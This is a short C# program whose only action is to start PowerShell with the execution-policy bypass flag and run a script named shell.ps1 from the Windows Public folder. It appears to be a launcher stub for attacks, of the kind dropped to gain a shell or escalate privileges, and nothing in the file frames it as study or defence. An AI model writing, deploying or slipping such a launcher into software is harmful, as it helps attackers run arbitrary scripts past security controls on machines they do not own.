using System;
using System.Diagnostics;


namespace RunProcess

{

	internal class Program

	{
		private static void Main(string[] args)

		{
			System.Diagnostics.Process.Start(@"c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe", "-ep bypass c:\\Users\\Public\\shell.ps1");
		}
	}
}